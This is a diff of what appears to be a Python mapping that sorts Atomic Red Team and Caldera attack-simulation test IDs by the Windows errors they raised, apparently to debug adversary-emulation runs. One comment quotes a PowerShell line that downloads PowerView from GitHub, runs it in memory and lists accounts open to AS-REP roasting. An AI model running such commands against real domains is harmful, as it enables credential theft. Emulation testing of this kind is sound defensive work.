+	"atomic_windows_depfalse_pshtrue__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__e0c75b4cc32124ef4c61508694fd0808", # ['Exception calling "FindAll" with "0" argument(s): "Unknown error (0x80005000)"At line:5253 char:20+             else { $Results = $UserSearcher.FindAll() }+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : COMException ']
+																																						 # ["[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose"]
 	"atomic_windows_depfalse_pshtrue__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__91a18ae1efe4119a549cea2ac7de72c4",
 	"atomic_windows_depfalse_pshtrue__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__58351281e64f2182ac4f8b44f63e9042",
 	"atomic_windows_depfalse_pshtrue__t1550_002__multiple__use_alternate_authentication_material-_pass_the_hash__8ce073cf3170576e1f5c6e4d06e1873a",
@@ -310,6 +425,8 @@
 	"atomic_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__cfcf66cc85109ad2ebdb301d619fa41f",
 
 	# Exception calling "ShouldContinue" with "2" argument(s): "Object reference not set to an instance of an object."At C:\\Program Files\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\PSModule.psm1:7455 char:8+     if($Force -or $psCmdlet.ShouldContinue
+	# # --- https://github.com/deadlydog/New-NuGetPackage/issues/14 (BUT HOW DO I KNOW WE HAVE NU-GET ON VM)
+
 	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__fca2ce47cdb3acfde35139ca9017af80",
 	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__c0177717b47f2cd07949186523fa3c6b",
 	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__a935a79ba61ecb00458208b0bd5ef15e",
@@ -324,82 +441,202 @@
 	"atomic_windows_depfalse_pshtrue__t1018__discovery__remote_system_discovery__aaeee9107989a507f526b0cef1cb274f",
 
 
+],
+
+# ===============================================================================================================================================================
+
+"Timeout reached, but couldn't kill the process": [	
+	"stockpile_windows_depfalse_pshtrue__t1548_002__privilege-escalation__abuse_elevation_control_mechanism-_bypass_user_access_control__e99cce5c-cb7e-4a6e-8a09-1609a221b90a",
+	"stockpile_windows_depfalse_pshtrue__t1548_002__privilege-escalation__abuse_elevation_control_mechanism-_bypass_user_access_control__e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+	"stockpile_windows_depfalse_pshtrue__t1548_002__privilege-escalation__abuse_elevation_control_mechanism-_bypass_user_access_control__b7344901-0b02-4ead-baf6-e3f629ed545f",
+	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__f50ec080343f1bec4e739dd20675c349", # team-viewer related
+	"atomic_windows_depfalse_pshtrue__t1218_011__defense-evasion__signed_binary_proxy_execution-_rundll32__16e96b0f0c0021663b2f5dfafabee6f0",
+	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__03a80d4a4c02d99295b5901ee695cc79",
+	"atomic_windows_depfalse_pshtrue__t1106__execution__native_api__2ca71106ee0aff2eda551bb6ed2b39e4",
+	"atomic_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__04d33ddae0126966ae6d841267c17329",
+	"atomic_windows_depfalse_pshtrue__t1090_003__command-and-control__proxy-_multi-hop_proxy__2f4c11504a21b8771b725a3e469fd74b",
+	"atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__8de14c0ea1b80dbd5de0cf5d28cff16b", # ['rundll32.exe keymgr,KRShowKeyMgr']
+],
+# ===============================================================================================================================================================
+
+"Timeout reached, process killed": [
+	"atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__b8e136dad1af7b29939e86be6d7ecefa",
+	"atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__413fc5fa7ac34f8a42183217d7f3ec90",
+	"atomic_windows_depfalse_pshtrue__t1056_002__multiple__input_capture-_gui_input_capture__6f5096d87a8f9ac4c397215cb58cc978",
+	"atomic_windows_depfalse_pshtrue__t1046__discovery__network_service_discovery__65e9fb2b4c023de2a2a73de5cc58ce7f",
+],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
+
+"Property Security Packages does not exist at path <X>": [
+	"atomic_windows_depfalse_pshtrue__t1547_005__multiple__boot_or_logon_autostart_execution-_security_support_provider__cc5347b500dfbdbb96b1fdb6a0669708",
+	
+],
+# ===============================================================================================================================================================
+
+
+"System error 1355 has occurred.The specified domain either does not exist or could not be contacted." : [
+	"stockpile_windows_depfalse_pshtrue__t1201__discovery__password_policy_discovery_for_a_domain__2946edba-54d8-11eb-ae93-0242ac130002",
+	"atomic_windows_depfalse_pshtrue__t1110_003__credential-access__brute_force-_password_spraying__279d24eeb12b40e4547945accf59ca62",
+	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__4712f45e41760276d20885bbc885a2ef", # related to Active Directory
+],
+# ===============================================================================================================================================================
+
+
+# might be hard to deal with this? because issue is with the remote-server?
+"The remote server returned an error": [
+	"stockpile_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__bfff9006-d1fb-46ce-b173-92cb04e9a031",
+	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__9332aff267b00ede37b09606340ee1dc",
+	"atomic_windows_depfalse_pshtrue__t1176__persistence__browser_extensions__70f8b4c0be2ee69f07592eee0aa5acc0",
+
+],
+# ===============================================================================================================================================================
+
+"Could not connect to the domain": [
+	"atomic_windows_depfalse_pshtrue__t1110_003__credential-access__brute_force-_password_spraying__c285cfeaf0c226d3d2b3812726dbe3a8",
+],
+# ===============================================================================================================================================================
+
+"Unexpected token": [
+	"atomic_windows_depfalse_pshtrue__t1615__discovery__group_policy_discovery__38714562d32f33dc32bd7aef553771d9",
+	"atomic_windows_depfalse_pshtrue__t1564_006__defense-evasion__run_virtual_instance__5b0527d3382ac91860501cccc9595348",
+	"atomic_windows_depfalse_pshtrue__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__8b5f748da9647a4d9c5a37f20124ba9c",
+	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__c5951c819c5f6125e0e5987a12a344f9",
+
+],
+# ===============================================================================================================================================================
+
+"Cannot enumerate domain":[
+	"atomic_windows_depfalse_pshtrue__t1615__discovery__group_policy_discovery__834e861bba95b87d066e84c5c6b056a0"
+],
+
+# ===============================================================================================================================================================
+
+"You must provide a value expression":[
+	"atomic_windows_depfalse_pshtrue__t1572__command-and-control__protocol_tunneling__69b202bf0bb7b4ff43d4abb8867c1784"
+],
+# ===============================================================================================================================================================
+
+
+"The option <X> is unknown":[
+	"atomic_windows_depfalse_pshtrue__t1570__lateral-movement__lateral_tool_transfer__5458332f329c896a133982a7df20d358"
+],
+# ===============================================================================================================================================================
+
+"A parameter cannot be found that matches parameter name":[
+	"atomic_windows_depfalse_pshtrue__t1570__lateral-movement__lateral_tool_transfer__4de0ba1566249a72e81e74707cc91a00"
+],
+# ===============================================================================================================================================================
+
+
+# https://stackoverflow.com/questions/53977293/try-hard-to-learn-powershell-error-the-hash-literal-was-incomplete
+# --> eems to relate to having missin gcurly brace/
+"The hash literal was incomplete": [
+	"atomic_windows_depfalse_pshtrue__t1567_003__exfiltration__exfiltration_over_web_service-_exfiltration_to_text_storage_sites__c275ffb52331397b42ebc52338be3c8c",
+	"atomic_windows_depfalse_pshtrue__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__938a659c52ed102a8b35c7b1bb49eb11",
+	"atomic_windows_depfalse_pshtrue__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__4df4fdb269f34dd6d55969c83ff06c73",
+	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__c087fa2d3870144b9fd442f476e7768a",
+	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__c0bc49e3838d26569b243ae283082926",
+	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__b26ce33f4cd29428f619fc600e052350",
+	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__79cb459770a15ea9e56b874d62bf8319",
+	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__61e9071d7b1f01969893d015526e1099",
+	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__48dc8d6cce12ca22b19fdbc93bd3a9ed",
+	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__9eb61c26282c5b324e1fb6cceeefc445",
+	"atomic_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__725f6e03f3e2098c4303861566f18894",
 
 
 ],
+# ===============================================================================================================================================================
+
+"Could not open the alternate data stream": [
+	"atomic_windows_depfalse_pshtrue__t1564_004__defense-evasion__hide_artifacts-_ntfs_file_attributes__1532b3faf25ad1e6f4fba4ada643b253"
+],
+# ===============================================================================================================================================================
+
+"Cannot find any service with service name": [
+	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__f5b48f9f8e01db3edd487c05580a0e90",
+],
+# ===============================================================================================================================================================
+
+"Feature name <X> is unknown": [
+	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__afae914d4839d5194835d8475604e7b8",
+],
+
+# ===============================================================================================================================================================
 
 
 "Cannot validate argument on parameter": [
 	"atomic_windows_depfalse_pshtrue__t1505_005__persistence__server_software_component-_terminal_services_dll__7cd26e24cc23c5a7e1183120fa034f89",
 ],
 
+# ===============================================================================================================================================================
 
+# [ Prioritize in fixing ]
 "Cannot bind argument to parameter <X> because it is an empty string": [
 	"atomic_windows_depfalse_pshtrue__t1046__discovery__network_service_discovery__01f95fd0213aeb1eb07fca8dc548f5ce",
 
 ],
 
+# ===============================================================================================================================================================
 
 "Ldap Error":[
 	"atomic_windows_depfalse_pshtrue__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__8b5f748da9647a4d9c5a37f20124ba9c",
 
 ],
 
+# ===============================================================================================================================================================
 
 "No characters are allowed after a here-string header but before the end of the line.": [
 	"atomic_windows_depfalse_pshtrue__t1558_002__credential-access__steal_or_forge_kerberos_tickets-_silver_ticket__8bdb353bbee5378745783ff6f2d49cb0",
 	"atomic_windows_depfalse_pshtrue__t1558_001__credential-access__steal_or_forge_kerberos_tickets-_golden_ticket__107a14acdd84a7d6e7c891177b0db3aa",
 	"atomic_windows_depfalse_pshtrue__t1558_001__credential-access__steal_or_forge_kerberos_tickets-_golden_ticket__6d0695f8f33776c82ad1294b6c6f02cd",
 ],
-
-
-"Program not installed issue":[
-	"atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__f6867f2b9b1b3c2eb733ad7ce7438f04", # team-viewer
-	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__560688901ad2b8f465e98c52379ae834", # chrome
-	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__5610bf38f44ad2da2ecb846ba776ecdc", # firefox
-	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__679ef375ad2b361965500392419d084c", # firefox
-	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__56c2f2d8b48bcb1c999d4e8929bd8d9b", # firefox
-	"atomic_windows_depfalse_pshtrue__t1539__credential-access__steal_web_session_cookie__d54bcaf2e58f6d95da2a54dcb5853a57", # firefox
-	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__820a346b2b676b51338c1170b675f76b", # vncviewer
-	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__1ce0e92b4cd09129c6d0f3aafb38c600", # Connect.exe
-
-],
-
+# ===============================================================================================================================================================
 
 "Cannot find a process with the name":[
 	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__abeb340acb3e1236c6919339942e7c77",
 	"atomic_windows_depfalse_pshtrue__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__337c07ce279b747827679ffb226e5d9c", # ['Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n']
 	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__f71199dcf1e307fc37c5a0cb9e4031b9", # ['ERROR: The process "a.exe" not found.']
 ],
-
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 "Encountered an error starting the process <X> : Access is denied.": [
 	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__c84a57391dbc724dc51436deb3e0ca00",
 	"atomic_windows_depfalse_pshtrue__t1069_002__discovery__permission_groups_discovery-_domain_groups__03c8721619373b6c18a55721a33cad2c",
 
 ],
+# ===============================================================================================================================================================
 
 "The certificate file could not be found.": [
 	"atomic_windows_depfalse_pshtrue__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__51ddafefb92c9dfcb6ce3369e7316bf3"
 ],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 
 "The specified module <X> was not loaded because no valid module file was found in any module directory": [
 	"atomic_windows_depfalse_pshtrue__t1552_004__credential-access__unsecured_credentials-_private_keys__2d78dfbfea7fa4ec7349993b83048079",
 	
 ]
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 
 "Error: Could not open   for writing.[X] Reason: The path is not of a legal form": [
 	"atomic_windows_depfalse_pshtrue__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__f2d48f9efed23e058bfe0f46d93d07a2",
 
 ]
+# ===============================================================================================================================================================
 
 "The client cannot connect to the destination specified in the request. Verify that the service on the destination is running and is accepting requests.":[
 	"atomic_windows_depfalse_pshtrue__t1546__multiple__event_triggered_execution__6fb0cdea444d58a340896d606baf281a",
 ],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 
 "Missing statement block after IF ( condition )": [
 	"atomic_windows_depfalse_pshtrue__t1546_008__multiple__event_triggered_execution-_accessibility_features__4bdc05fe2f0006f86575053dc740edf3",
 
 ],
+# ===============================================================================================================================================================
 
 "Missing statement body in foreach loop": [
 	"atomic_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__3b4fb2e38c41453a6b2b0f2fecdd84ff",
@@ -407,6 +644,8 @@
 	"atomic_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__1033c974479429c54dff4470e614113d",
 	"atomic_windows_depfalse_pshtrue__t1012__discovery__query_registry__54f95564a265f67159d1f8ff907cd156",
 ],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 
 # might need to understand script
 "Missing an argument for parameter" : [
@@ -423,11 +662,15 @@
 	"atomic_windows_depfalse_pshtrue__t1027__defense-evasion__obfuscated_files_or_information__1827aa5862b0a63ce537ed37636933d5",
 
 ],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 
 "Missing argument in parameter list" : [
 	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__ef943918da20ee40d378ad000bbcc3b7",
 
 ],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 
 "Missing closing": [
 	"atomic_windows_depfalse_pshtrue__t1005__collection__data_from_local_system__3db695e5387d0fd3bb4e53c330814b7f",
@@ -435,53 +678,45 @@
 ],
 
 
-"The Try statement is missing its Catch or Finally block": [
-	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__8862278ba483c0d5f719ffbc9186a901",
-	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__53187e13ccee0b0d71451ca3fdc1f9d9",
-	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__0690e0818b5749092595a472831f362f",
-	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__015d186adee85e65d7255b383e1a039f",
-	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__8aabc61664e947c69058c3df4f3af860",
-	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__3aae7c6d210ffb084186f1686a1f00c1",
-	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__1c1381522818218092a12b973593f3a9",
-	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__10a0f4f8efdae71f3e88b3e20560798a", # related to Active Directory
-	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__bba7fe7940f8719efa3c38e54ec79e2c",
-	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__0f3401d54f59bc1c3eca134ad5d8a774",
-	"atomic_windows_depfalse_pshtrue__t1036_003__defense-evasion__masquerading-_rename_system_utilities__d9c1b1283c1ad6fdda27be021c4737d3",
-	"atomic_windows_depfalse_pshtrue__t1018__discovery__remote_system_discovery__587a8743222626915bb08b3e9e132b19",
-
-	"atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__60bb6f8468aa98b75be2521861a164d5", # related to atomics
-],
+# ===============================================================================================================================================================
 
 
 "Service <X> cannot be started due to the following error: Cannot start service <X> on computer": [
 	"atomic_windows_depfalse_pshtrue__t1543_003__multiple__create_or_modify_system_process-_windows_service__7030b003cc5646c7cc83410d2f057575",
 
-	
 ],
+# ===============================================================================================================================================================
+
 
 "Searching for SQL Server instances in the domain": [
 	"atomic_windows_depfalse_pshtrue__t1518__discovery__software_discovery__57548b3eefc3c3d3eaf8c3b51380921a",
 ],
+# ===============================================================================================================================================================
 
 "The LDAP server is unavailable": [
 	"atomic_windows_depfalse_pshtrue__t1110_001__credential-access__brute_force-_password_guessing__4f277a5607b655a2e5bc05ff21ed81cf",
 ],
+# ===============================================================================================================================================================
 
 
 "Unable to find a default server with Active Directory Web Services running": [
 	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__4bf4facd1dad540d4b17ebe0db235707",
 ],
 
+# ===============================================================================================================================================================
 
 "Unable to connect to the remote server": [
 	"atomic_windows_depfalse_pshtrue__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__548a620bf3463f72a42937faf7614935",
 	"atomic_windows_depfalse_pshtrue__t1027__defense-evasion__obfuscated_files_or_information__7b6d0accaab6330d701dea8f4d7d96d4", # Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body "9070cd_T1027-cc-macro.xlsm
 
 ],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 
 "<X> can't find <IP-ADDRESS>: Non-existent domain": [
 	"atomic_windows_depfalse_pshtrue__t1018__discovery__remote_system_discovery__13a0c78dbd8d3645db69540bfe7cd038", # etw0-1 can't find 192.168.122.2: Non-existent domain
 ],
+# ===============================================================================================================================================================
 
 # Note that TTPs that failed due to Active Directory issue are distributed under multiple error-categories
 #  -- this is just for explicit, since couldn't find a corresponding 'other' error-category
@@ -490,40 +725,50 @@
 
 ],
 
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
+
 "Input redirection is not supported": [
 	"atomic_windows_depfalse_pshtrue__t1113__collection__screen_capture__582871bcbf9a88caed89ae25d76d018c",
 ],
 
+# ===============================================================================================================================================================
 
 "CertUtil: ASN1 bad tag value met.": [
 	"atomic_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__2ed8948f1c1156af47d50379e7965d90",
 ],
 
+# ===============================================================================================================================================================
 
 
 "node<x> - Alias not found": [
 	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__ffe23675b3b68eb6d2b6e771451de3af",
 
 ],
+# ===============================================================================================================================================================
 
 "Invalid namespace": [
 	"atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__c58ba91431b9d73d726ccdd7d030a694",
 ],
+# ===============================================================================================================================================================
 
 
 "No MSFT_SMBShare objects found with property": [
 	"atomic_windows_depfalse_pshtrue__t1070_005__defense-evasion__indicator_removal_on_host-_network_share_connection_removal__6940ffd670787cd1c410997e66629573",
 ],
+# ===============================================================================================================================================================
 
 "The string is missing the terminator": [
 	"atomic_windows_depfalse_pshtrue__t1069_002__discovery__permission_groups_discovery-_domain_groups__0a96ef5851da1be487cebdd9a1f86b7a",
 
 ],
+# ===============================================================================================================================================================
 
 "No characters are allowed after a here-string header but before the end of the line": [
 	"atomic_windows_depfalse_pshtrue__t1036_005__defense-evasion__masquerading-_match_legitimate_name_or_location__029770bd7c3a403daeab3af692af0046",
 
 ],
+# ===============================================================================================================================================================
 
 
 "Gibberish": [
@@ -531,11 +776,14 @@
 
 ],
 
+# ===============================================================================================================================================================
 
 "The expression after <X> in a pipeline element produced an object that was not valid. It must result in a command name, a script block, or a CommandInfo object": [
 	"atomic_windows_depfalse_pshtrue__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__3f73be176cadf2762623b3117e25335d",
 
 ],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
 
 "SyntaxError: invalid syntax": [
 	"atomic_windows_depfalse_pshtrue__t1046__discovery__network_service_discovery__114ad8aad10ca59e6a10b655764d749a", # maybe fixable
@@ -548,6 +796,7 @@
 	"atomic_windows_depfalse_pshtrue__t1057__discovery__process_discovery__1ddf2b8ee6a56ce9f9132a168947653e", # did this really fail?
 	"atomic_windows_depfalse_pshtrue__t1020__exfiltration__automated_exfiltration__305c23215a4bf6184ed701b5ca1d1af7", # ['N/A Caldera Link-Output (Possible/Valid Case)']
 ],
+# ===============================================================================================================================================================
 
 
 }
